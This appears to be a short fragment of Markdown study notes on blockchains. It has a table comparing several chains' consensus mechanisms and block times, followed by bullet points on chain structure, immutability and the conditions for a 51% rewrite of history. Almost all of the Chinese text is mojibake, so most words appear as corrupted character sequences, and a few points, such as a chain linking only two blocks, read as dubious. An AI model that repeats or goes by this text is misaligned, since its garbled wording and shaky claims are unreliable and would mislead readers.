| **ä»¥å¤ªåŠ**                 | PoSï¼ˆç°ä¸ºCasperï¼‰         | ~12 ç§’      | åˆå¹¶å‰æ˜¯ PoWï¼ˆ13-15ç§’ï¼‰ï¼Œåˆå¹¶åç•¥å¿«           |
| **BNB Chain**           | PoSAï¼ˆæ··åˆPoS+Authorityï¼‰ | ~3 ç§’       | é«˜ååï¼Œä¸­å¿ƒåŒ–ç¨‹åº¦è¾ƒé«˜                      |
| **Solana**              | PoH + PoS             | ~0.4 ç§’     | æå¿«å‡ºå—ï¼Œé«˜æ€§èƒ½ï¼Œä½†æ›¾å› å®•æœºå—è´¨ç–‘                |
| **Avalanche**           | Avalanche Consensus   | ~1-2 ç§’     | å¹¶è¡Œå¤„ç†äº¤æ˜“ï¼Œé«˜é€Ÿå¯æ‰©å±•                     |
| **Cosmos**              | Tendermintï¼ˆBFTç±»ï¼‰      | ~6-7 ç§’     | å¿«é€Ÿç¡®è®¤ï¼Œé€‚ç”¨äºè·¨é“¾é€šä¿¡                     |
| **Arbitrum / Optimism** | Layer2 Rollup         | ä»¥å¤ªåŠ L1åŒºå—ä¸ºé”š | Rollup æœ¬èº«ç§’çº§å¤„ç†ï¼Œä½†ä¸Šé“¾ç»“ç®—éœ€è¦ç­‰å¾… L1 çš„ç¡®è®¤æ—¶é—´ |
| **Celestia**            | Modular + DAå±‚         | ~3-5 ç§’     | ä»…è´Ÿè´£æ•°æ®å¯ç”¨æ€§ï¼Œä¸æ‰§è¡Œäº¤æ˜“                   |

	* é“¾ï¼š
		* ä¸€æ¡é“¾åªå¯ä»¥é“¾æ¥ä¸¤ä¸ªåŒºå—ã€‚
		* åŒºå—æŒ‰ç…§é¡ºåºä¸²è”
* ç‰¹ç‚¹ï¼š
	* ä¸å¯ç¯¡æ”¹ï¼šæ— æ³•æ”¹å˜å†å²ä¿¡æ¯ï¼Œå› ä¸ºæ¯ä¸ªåŒºå—åŒ…å«äº†ä¸Šä¸€ä¸ªåŒºå—çš„æ‘˜è¦å¹¶ä¸²è”èµ·æ¥ï¼Œå¦‚æœä½ ä¿®æ”¹äº†å†å²çš„åŒºå—ï¼Œä½ å°†å¿…é¡»ä¿®æ”¹åé¢çš„å…¨éƒ¨åŒºå—ã€‚
		* ç¯¡æ”¹æ¡ä»¶ï¼šï¼ˆæˆæœ¬é«˜ï¼Œéš¾åº¦å¤§ï¼‰
			* é‡å†™ç›®æ ‡åŒºå—åŠå…¶åçš„æ‰€æœ‰åŒºå—  
			- æ§åˆ¶å…¨ç½‘ 51% çš„è®¡ç®—èƒ½åŠ›ï¼ˆPoWï¼‰
			- é¿å…è¢«å…¶ä»– honest èŠ‚ç‚¹è¯†ç ´å¹¶æ‹’ç»åŒæ­¥
			- å¿«é€Ÿè¿½èµ¶å¹¶è¶…è¿‡ç°æœ‰åˆæ³•æœ€é•¿é“¾
	* å…¬å¼€é€æ˜ï¼ŒåŒ¿å
	* å¿«é€Ÿäº¤æ˜“ï¼šç›¸æ¯”ä¼ ç»Ÿçš„è·¨å›½æ±‡æ¬¾éå¸¸å¿«é€Ÿä¾¿æ·ã€‚


# 2025.07.30


<!-- Content_END -->
